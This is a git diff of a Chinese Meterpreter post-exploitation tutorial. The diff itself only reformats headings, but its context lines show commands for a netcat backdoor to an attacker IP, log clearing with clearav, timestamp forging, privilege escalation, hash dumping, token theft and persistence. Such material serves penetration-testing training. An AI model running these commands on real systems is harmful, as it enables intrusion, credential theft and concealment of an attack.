@@ -21,7 +21,7 @@ sessions -k 2   # 结束会话
 
 获取到了meterpreter，就可以进行后渗透了。
 
-#### 1 基本系统命令
+###  1.基本系统命令
 
 ```bash
 # 会话管理
@@ -95,7 +95,7 @@ nc -v 192.168.81.162 443  #攻击者连接nc后门
 clearav  #清除windows中的应用程序日志、系统日志、安全日志
 ```
 
-#### 2 文件系统命令
+### 2 文件系统命令
 
 ```bash
 cat/ls/cd/rm  # 基本命令
@@ -115,7 +115,7 @@ timestomp -v C://2.txt   #查看时间戳
 timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
 ```
 
-#### 3 网络命令
+### 3 网络命令
 
 ```bash
 # 基本
@@ -162,7 +162,7 @@ sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包
 sniffer_stop 2   #停止抓包
 ```
 
-#### 4 信息收集
+### 4 信息收集
 
 ```bash
 # 信息收集的脚本位于：
@@ -180,7 +180,7 @@ run post/windows/gather/enum_patches  #补丁信息
 run post/windows/gather/enum_domain  #查找域控
 ```
 
-#### 5 提权
+### 5 提权
 
 1.getsystem提权 getsystem工作原理： ①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。 ②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。 ③Windows服务已启动，导致与命名管道建立连接。 ④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。 然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。
 
@@ -287,7 +287,7 @@ msf5 exploit(windows/local/ms13_081_track_popup_menu) > exploit
 # 然鹅失败了，摸摸头
 ```
 
-#### 6 获取凭证
+### 6 获取凭证
 
 在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。
 
@@ -398,7 +398,7 @@ meterpreter > run powerdump
 [-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.
 ```
 
-#### 7 假冒令牌
+### 7 假冒令牌
 
 在用户登录windows操作系统时，系统都会给用户分配一个令牌\(Token\)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。
 
@@ -419,7 +419,7 @@ steal_token <pid值>   #从指定进程中窃取token   先ps
 drop_token  #删除窃取的token
 ```
 
-#### 8 植入后门
+### 8 植入后门
 
 Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。
 
